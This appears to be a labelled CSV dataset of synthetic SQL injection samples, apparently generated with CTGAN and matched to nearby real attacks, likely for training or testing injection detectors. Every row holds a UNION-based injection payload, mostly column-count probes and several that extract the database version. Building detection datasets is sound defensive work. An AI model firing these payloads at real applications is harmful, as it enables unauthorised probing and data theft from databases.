id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000017,12.115872407124943
CTGAN_000002,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,7.892818608593913
CTGAN_000003,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,5.754304027149942
CTGAN_000004,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,8.659085486146783
CTGAN_000005,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000241,6.608168871994962
CTGAN_000006,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000193,6.524193690706759
CTGAN_000007,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000277,7.803581129661447
CTGAN_000008,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000032,8.628278735282652
CTGAN_000009,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000307,5.920537316459401
CTGAN_000010,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,6.170695537286946
CTGAN_000011,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,5.768088342588641
CTGAN_000012,attack,union,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000088,7.443443770501113
CTGAN_000013,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,8.09456060555623
CTGAN_000014,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,6.012472444723757
CTGAN_000015,attack,union,union all select @@version--,nearest_attack_euclidean,R000023,8.906107389065264
CTGAN_000016,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000257,7.102627176402274
CTGAN_000017,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,5.401969725259969
CTGAN_000018,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,7.211818528470745
CTGAN_000019,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000079,9.00269866452963
CTGAN_000020,attack,union,"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000189,6.596138874803743
